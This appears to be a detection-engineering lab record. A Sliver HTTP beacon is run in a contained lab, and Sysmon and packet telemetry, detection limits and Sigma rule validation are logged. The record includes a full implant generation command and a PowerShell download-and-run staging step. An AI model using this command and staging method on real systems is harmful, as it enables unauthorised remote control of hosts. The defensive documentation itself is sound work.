scenario.name: Bounded HTTP C2 foothold and host survey
scenario.scope: Generate and run one Windows beacon, establish contained HTTP C2 to Kali, perform bounded discovery and shell execution, and download one fixed non-host-data marker.

environment.topology: Contained vmbr1 lab; no external C2 endpoint configured

sensors.name: Sysmon
config_notes: Unfiltered process creation, network connection, DNS, file, and registry telemetry.
Named-pipe events were in the requested sensor model, but this run produced zero EID 17/18 events.

sensors.name: pktmon
sensors.configuration: NIC components, all packets, full packet size, 64 MB circular capture

tool.name: Sliver

implant.name: sliver-verify-feasibility
implant.c2_transport: Sliver HTTP(S) transport using cleartext HTTP framing with Sliver application-layer encryption
implant.generation_command: generate beacon --http 192.168.1.50:18080 --os windows --arch amd64 --format exe --name SLIVER-VERIFY-FEASIBILITY --seconds 5 --jitter 0 --save /tmp/sliver-verification/feasibility.exe

tool.server_automation: sliver-server --rc <command-script> for feasibility; isolated daemon plus loopback operator client for the canonical run

feasibility_checkpoint.listener_result: Scripted console reported Successfully started job #1 and ss confirmed 192.168.1.50:18080 listening.
feasibility_checkpoint.implant_result: Scripted console generated the Windows beacon artifact and its SHA-256 was recorded.
feasibility_checkpoint.state_isolation: SLIVER_ROOT_DIR=/tmp/sliver-verification/state; pre-existing /root/.sliver data was not modified or removed.

deployment.requested_helper_result: lab-push could not target VM 104 because the installed helper invokes bash in the guest and Windows has no bash.exe; a large Kali lab-pull also exceeded the guest-agent response size.
deployment.contained_fallback: A temporary Python HTTP server bound only to 192.168.1.50:18081 served feasibility.exe; VM 104 downloaded it with PowerShell Invoke-WebRequest, the target hash matched, and the staging server was immediately stopped.

observed_techniques.observation: The beacon used HTTP framing to the contained listener and Sysmon recorded 213 attributed outbound TCP connections.

observed_techniques.observation: Sliver application-layer encrypted payloads were carried inside the HTTP transport; packet evidence retained only framing and flow metadata.

network_and_dns.details: Sysmon recorded 213 implant-attributed initiated TCP connections from 192.168.1.52 to 192.168.1.50:18080 between 08:57:17Z and 09:07:10Z. The literal-IP C2 generated zero implant EID 22 DNS queries. One separate PowerShell EID 3 connection to the temporary contained staging port 18081 was observed.

files.details: EID 11 recorded PowerShell writing C:\lab\sliver-verify.exe, Windows creating SLIVER-VERIFY.EXE-51525AC4.pf, and implant-spawned cmd.exe creating C:\lab\sliver-proof.txt. No related EID 23 or 26 was observed.

registry.details: The implant ProcessGuid produced ten EID 12 CreateKey events under Internet Settings\Connections and TenantRestrictions\Payload during HTTP initialization. No implant-attributed EID 13 or 14 was observed. These common Windows networking/policy paths were too nonspecific for a useful Sigma rule.

process_identity_and_command.details: EID 1 recorded the generated implant, absent PE identity metadata, path, hash, SYSTEM context, and PowerShell parent. Five cmd.exe children were recorded; the final two parser-safe commands succeeded.

parent_child.status: observed process parent-child; no named pipes
parent_child.details: EID 1 recorded C:\lab\sliver-verify.exe directly spawning cmd.exe for execute tasks. The HTTP-beacon flow produced zero Sysmon EID 17/18 named-pipe events.

evidence.description: Sanitized Sysmon fields, counts, and representative events for all five observation dimensions.
Sanitized packet-flow and HTTP-profile counts plus capture hash; excludes cookies, tokens, randomized URIs, and payloads.

sigma.observation: Not exercised; retained as a behavior-based future pivot-C2 rule.

detection_limitations: The Tier 1 network Sigma rule represents one outbound connection and cannot express periodic-beacon correlation by itself.

Robust Sliver C2 detection needs network IDS/NSM telemetry such as Suricata or Zeek for flow periodicity, HTTP-profile analysis, and JA3/JARM when TLS or mTLS is used. This lab currently has pktmon packet capture but no persistent Suricata/Zeek sensor.
JA3/JARM were not available for this cleartext-HTTP-framed run. Sliver's application payload remained encrypted even though HTTP headers were observable.
Generated names, hashes, URI paths, headers, and transport profiles are operator-configurable; no committed Sigma rule relies on the lab C2 address or the generated implant identity.

sanitization.notes: Only detection-relevant telemetry fields and aggregate packet metadata are committed. The raw pcap contained ephemeral C2 cookie material and was excluded.

validation.pysigma: All five rules parsed successfully with pySigma on 2026-08-09.
validation.json: verification.json and both evidence JSON files passed jq validation on 2026-08-09.
